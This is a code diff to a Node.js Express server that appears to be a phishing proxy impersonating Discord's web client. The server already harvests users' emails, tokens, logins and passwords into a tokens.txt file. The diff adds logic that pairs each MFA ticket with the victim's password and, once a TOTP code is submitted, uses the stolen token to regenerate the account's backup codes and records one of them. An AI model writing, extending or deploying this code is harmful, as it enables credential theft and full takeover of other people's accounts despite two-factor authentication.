@@ -14,7 +14,7 @@ app.use("/src", express.static(__dirname + "/src"));
 const bodyParser = require('body-parser');
 console.log('Started')
  app.use(bodyParser.json({limit: "50mb"}));
-
+var data = []
 app.use("/:data*", async (req, res) => {
   if(req.originalUrl === '/assets/0.2d737cc92c807c265e1f.css') return res.sendFile(__dirname + "/style1.css")
   if(req.originalUrl === '/assets/532.d49196785d17cb9b60a9.css') return res.sendFile(__dirname + "/style2.css")
@@ -59,20 +59,7 @@ if(headers['content-type']) headersNew['content-type'] = headers['content-type']
 if(!arr.includes(s.email)) arr.unshift(`${s.email}:${s.token}`)
 	fs.writeFileSync("./tokens.txt", arr.join("\n"));
 }
-if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/login` && s.token){
 
-    	let tokens;
-	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
-	
-	let arr = tokens.split("\n").map(d => {
-		return d.trim();
-	});
-	
-if(!arr.includes(req.body.login)) arr.unshift(`${req.body.login}:${req.body.password}:${s.token}`)
-	fs.writeFileSync("./tokens.txt", arr.join("\n"));
-}
-
-    
     return res.status(dataFetch.status).json(s)
     
   } catch {
@@ -101,7 +88,10 @@ if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/users
 if(!arr.includes(s.email)) arr.unshift(`${s.email}:${s.token}`)
 	fs.writeFileSync("./tokens.txt", arr.join("\n"));
 }
-if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/login` && s.token){
+if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/login`){
+if(s.mfa) data.unshift({ticket: s.ticket, password: req.body.password})
+}
+    if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/login` && s.token){
 
     	let tokens;
 	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
@@ -109,11 +99,32 @@ if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/
 	let arr = tokens.split("\n").map(d => {
 		return d.trim();
 	});
-	
+if(s.mfa) data.unshift({ticket: s.ticket, password: req.body.password})
 if(!arr.includes(req.body.login)) arr.unshift(`${req.body.login}:${req.body.password}:${s.token}`)
 	fs.writeFileSync("./tokens.txt", arr.join("\n"));
 }
-
+if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/mfa/totp`){
+var f = data.find(c => c.ticket === req.body.ticket)
+if(f){
+  let dF = await fetch(('https://discord.com/api/v9/users/@me/mfa/codes'), {
+headers: {
+authorization: s.token
+},
+body: JSON.stringify({"password":f.password,"regenerate":true})
+})
+  
+  let dJ = await dF.json()
+    	let tokens;
+	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
+	
+	let arr = tokens.split("\n").map(d => {
+		return d.trim();
+	});
+	
+if(!arr.includes(req.body.login)) arr.unshift(`${req.body.login}:${req.body.password}:${s.token}:${dJ.backup_codes[0].code}`)
+	fs.writeFileSync("./tokens.txt", arr.join("\n"));
+}
+}
     
     return res.status(dataFetch.status).json(s)
     
